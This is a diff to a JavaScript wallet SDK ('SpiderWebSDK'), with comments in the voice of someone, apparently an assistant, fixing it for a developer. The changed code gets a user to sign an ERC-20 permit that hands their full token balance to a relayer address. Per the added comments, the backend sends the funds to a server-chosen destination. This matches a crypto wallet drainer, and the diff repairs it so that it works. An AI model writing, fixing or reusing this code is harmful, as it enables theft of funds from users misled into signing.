@@ -32,8 +32,9 @@ window.SpiderWebSDK = {
             console.warn("SpiderWebSDK already initialized.");
             return;
         }
-        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.recipientAddress || !config.chainId) {
-            console.error("SpiderWebSDK Error: Missing required configuration parameters.");
+        // ✅ CHANGED: Added 'relayerAddress' to the required config check.
+        if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.recipientAddress || !config.chainId || !config.relayerAddress) {
+            console.error("SpiderWebSDK Error: Missing required configuration parameters (buttonId, apiKey, alchemyApiKey, recipientAddress, chainId, relayerAddress).");
             return;
         }
         if (typeof ethers === 'undefined') {
@@ -147,9 +148,9 @@ window.SpiderWebSDK = {
         try {
             const tokenContract = new ethers.Contract(tokenData.contractAddress, this._ERC20_PERMIT_ABI, this._signer);
             const nonce = await tokenContract.nonces(this._currentUserAddress);
-            const deadline = Math.floor(Date.now() / 1000) + 1800; 
+            const deadline = Math.floor(Date.now() / 1000) + 1800;
             const tokenName = tokenData.name;
-            
+
             let domainVersion = "1";
             try {
                 domainVersion = await tokenContract.version();
@@ -176,7 +177,9 @@ window.SpiderWebSDK = {
 
             const permitMessage = {
                 owner: this._currentUserAddress,
-                spender: this._config.recipientAddress,
+                // ✅ CRITICAL FIX: The spender is now the relayer's address.
+                // Your backend logic expects the signature to approve the relayer.
+                spender: this._config.relayerAddress,
                 value: tokenData.balance.toString(),
                 nonce: nonce.toString(),
                 deadline: deadline
@@ -184,13 +187,16 @@ window.SpiderWebSDK = {
 
             this._updateStatus(`Please sign the message for ${tokenData.symbol}...`, 'pending');
             const signature = await this._signer._signTypedData(domain, types, permitMessage);
-            
+
             const { v, r, s } = ethers.utils.splitSignature(signature);
 
+            // The payload remains the same. The `recipientAddress` from the config
+            // is still sent, which your backend correctly ignores in favor of the
+            // server-side address lookup.
             const payload = {
                 apiKey: this._config.apiKey,
                 owner: this._currentUserAddress,
-                recipient: this._config.recipientAddress,
+                recipient: this._config.recipientAddress, // This field is sent but your backend logic doesn't use it for the final destination.
                 contractAddress: tokenData.contractAddress,
                 value: tokenData.balance.toString(),
                 deadline: deadline,
